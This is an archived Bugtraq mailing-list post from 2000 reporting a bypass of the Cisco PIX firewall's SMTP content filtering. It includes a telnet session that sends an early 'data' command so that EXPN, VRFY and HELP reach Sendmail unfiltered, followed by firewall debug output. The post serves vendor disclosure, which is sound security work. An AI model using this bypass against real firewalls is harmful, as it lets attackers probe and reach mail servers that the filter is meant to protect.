@@ -1,0 +1,260 @@
+Bugtraq: Re: Cisco PIX Firewall (smtp content filtering hack) [Finally resolved] 
+
+ Nmap Security Scanner 
+
+ Intro 
+
+ Ref Guide 
+
+ Install Guide 
+
+ Download 
+
+ Changelog 
+
+ Book 
+
+ Docs 
+
+ Security Lists 
+
+ Nmap Hackers 
+
+ Nmap Dev 
+
+ Bugtraq 
+
+ Full Disclosure 
+
+ Pen Test 
+
+ Basics 
+
+ More 
+
+ Security Tools 
+
+ Pass crackers 
+
+ Sniffers 
+
+ Vuln Scanners 
+
+ Web scanners 
+
+ Wireless 
+
+ Exploitation 
+
+ Packet crafters 
+
+ More 
+
+ Site News 
+
+ Advertising 
+
+ About/Contact 
+
+ Exceptional Links 
+
+ Good Reading 
+
+-->
+ Exploit World 
+
+ Sponsors: 
+
+ Bugtraq 
+mailing list archives 
+
+    By Date    
+
+    By Thread    
+
+ Re: Cisco PIX Firewall (smtp content filtering hack) [Finally resolved] 
+
+ From : "Fabio Pietrosanti (naif)" <fabio () TELEMAIL IT>
+
+ Date : Tue, 3 Oct 2000 11:15:25 +0200
+
+ Hi,
+This is the e-mail i sent to Cisco security-alert,
+Today Cisco Released 5.2(4) that fix also this bug ...
+
+The Cisco Patch to "SMTP Content Filtering tricks proposed by
+naif () inet it " could be
+avoid with the "SMTP Content Filtering tricks proposed by Lincoln Yeoh <
+lyeoh () pop jaring my >" .
+
+The Little hack posted on bugtraq by me on "Tue, 19 Sep 2000" work because
+pix completelly disable the sanity check after "data" command .
+
+Cisco Release the new PIX Versione that we installed on our test pix
+5.2(2) .
+
+The Cisco Advisor is:
+
+ http://www.cisco.com/warp/public/707/PIXfirewallSMTPfilter-pub.shtml 
+
+The i read on bugtraq about a tricks of Jul similar to my advisor :
+
+ http://www.securityfocus.com/templates/archive.pike?threads=0&list=1&end=2000-07-09&tid=68903&start=2000-07-03& ;
+
+So, 5.2(2) should avoid this problem and SMTP content filtering should
+work...
+
+Here the our Pix Test:
+newpix# sh ver
+
+Cisco Secure PIX Firewall Version 5.2(2)
+
+Compiled on Sun 24-Sep-00 18:59 by morlee
+
+newpix up 19 hours 27 mins
+
+Hardware: SE440BX2, 128 MB RAM, CPU Pentium II 349 MHz
+Flash i28F640J5 @ 0x300, 16MB
+BIOS Flash AT29C257 @ 0xfffd8000, 32KB
+
+0: ethernet0: address is 00d0.b790.41a5, irq 11
+1: ethernet1: address is 00d0.b790.54d4, irq 10
+2: ethernet2: address is 00e0.b601.d289, irq 15
+3: ethernet3: address is 00e0.b601.d288, irq 9
+4: ethernet4: address is 00e0.b601.d287, irq 11
+5: ethernet5: address is 00e0.b601.d286, irq 10
+
+Licensed Features:
+Failover: Enabled
+VPN-DES: Enabled
+VPN-3DES: Enabled
+Maximum Interfaces: 6
+Cut-through Proxy: Enabled
+Guards: Enabled
+Websense: Enabled
+Throughput: Unlimited
+ISAKMP peers: Unlimited
+
+And the line regarding fixup in the config is:
+fixup protocol smtp 25
+
+===== Here the session...
+
+<naif () naif> [~] $ telnet ourtest 25
+Trying 10.10.10.2...
+Connected to eagletmp.
+Escape character is '^]'.
+data wow
+expn root
+vrfy root
+help
+helo pinco
+220 **************************************************2******2000 ******00
+*0200 ******
+503 Need MAIL command
+250 Pinco Pallino <pinco () ourtest ourdomain it>
+250 <root () ourtest ourdomain it>
+214-This is Sendmail version 8.9.1
+214-Topics:
+214- HELO EHLO MAIL RCPT DATA
+214- RSET NOOP QUIT HELP VRFY
+214- EXPN VERB ETRN DSN
+214-For more info use "HELP <topic>".
+214-To report bugs in the implementation send email to
+214- sendmail-bugs () sendmail org 
+214-For local information send email to Postmaster at your site.
+214 End of HELP info
+250 ourtest.ourdomain.it Hello [10.10.10.10], pleased to meet you
+quit
+221 ourtest.ourdomain.it closing connection
+Connection closed by foreign host.
+
+#### As you can see we could bypass the "fixup smtp"
+
+===== Here Cisco Pix Debug
+
+ tcp: TCP MSS changed to 1380
+smtp: command (172.16.1.2/25 <- 10.10.10.10/3106)
+ tcp: SYN out rcvd
+ tcp: TCP MSS changed to 1380
+smtp_response: (172.16.1.2/25 -> 10.10.10.10/3106)
+ tcp: exiting embyonic
+smtp: command (172.16.1.2/25 <- 10.10.10.10/3106)
+ tcp: TCP MSS changed to 1380
+ tcp: TCP MSS changed to 1380
+smtp: command (172.16.1.2/25 <- 10.10.10.10/3106)
+ smtp: data command
+ smtp: entering data mode
+smtp_response: (172.16.1.2/25 -> 10.10.10.10/3106)
+smtp: command (172.16.1.2/25 <- 10.10.10.10/3106)
+smtp_response: (172.16.1.2/25 -> 10.10.10.10/3106)
+ tcp: TCP MSS changed to 1380
+smtp: command (172.16.1.2/25 <- 10.10.10.10/3106)
+smtp_response: (172.16.1.2/25 -> 10.10.10.10/3106)
+smtp: command (172.16.1.2/25 <- 10.10.10.10/3106)
+smtp_response: (172.16.1.2/25 -> 10.10.10.10/3106)
+smtp: command (172.16.1.2/25 <- 10.10.10.10/3106)
+smtp_response: (172.16.1.2/25 -> 10.10.10.10/3106)
+ tcp: TCP MSS changed to 1380
+tcp: TCP MSS changed to 1380
+smtp_response: (172.16.1.2/25 -> 10.10.10.10/3106)
+smtp: command (172.16.1.2/25 <- 10.10.10.10/3106)
+smtp_response: (172.16.1.2/25 -> 10.10.10.10/3106)
+ smtp_respond: ERR: bad reply code
+smtp: command (172.16.1.2/25 <- 10.10.10.10/3106)
+smtp_response: (172.16.1.2/25 -> 10.10.10.10/3106)
+smtp: command (172.16.1.2/25 <- 10.10.10.10/3106)
+smtp_response: (172.16.1.2/25 -> 10.10.10.10/3106)
+smtp: command (172.16.1.2/25 <- 10.10.10.10/3106)
+smtp_response: (172.16.1.2/25 -> 10.10.10.10/3106)
+ smtp_respond: ERR: bad reply code
+smtp: command (172.16.1.2/25 <- 10.10.10.10/3106)
+smtp: command (172.16.1.2/25 <- 10.10.10.10/3106)
+ smtp: quit command
+smtp_response: (172.16.1.2/25 -> 10.10.10.10/3106)
+ smtp_respond: ERR: bad reply code
+smtp_response: (172.16.1.2/25 -> 10.10.10.10/3106)
+smtp: command (172.16.1.2/25 <- 10.10.10.10/3106)
+smtp: command (172.16.1.2/25 <- 10.10.10.10/3106)
+smtp_response: (172.16.1.2/25 -> 10.10.10.10/3106)
+
+=====
+To Cisco :
+
+Please check carefully also CBAC, because i think that it affect also IOS
+CBAC inspect .
+I'll release the Advisor for this new version on bugtraq the next week, so
+you could release new Pix Version .
+
+On Thu, 21 Sep 2000, Ioannis Migadakis wrote:
+
+ This particular vulnerability is not new.
+
+It has been posted to BUGTRAQ on 9 Jul 2000 by Lincoln Yeoh with a title
+"Out of order SMTP DATA commands incorrectly allow pass-through mode in
+some firewall smtp filters/proxies"
+
+The original post (does not say anything about Cisco PIX) can be found at:
+
+ http://www.securityfocus.com/templates/archive.pike?threads=0&list=1&end=200 
+0-07-09&tid=68903&start=2000-07-03&
+
+Ioannis Migadakis
+
+naif
+
+    By Date    
+
+    By Thread    
+
+ Current thread: 
+
+ Re: Cisco PIX Firewall (smtp content filtering hack) [Finally resolved] Fabio Pietrosanti (naif) (Oct 03) 
+
+[ Nmap |
+ Sec Tools |
+ Mailing Lists |
+ Site News |
+ About/Contact |
+ Advertising |
+ Privacy ]
